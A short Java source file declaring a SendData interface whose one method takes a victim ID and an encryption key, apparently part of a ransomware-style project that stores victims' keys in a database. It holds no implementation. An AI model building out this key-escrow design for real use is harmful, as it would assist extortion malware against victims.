package db;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.Statement;

public interface SendData {
    public  boolean send(String victimID, String encryptionKey);
}
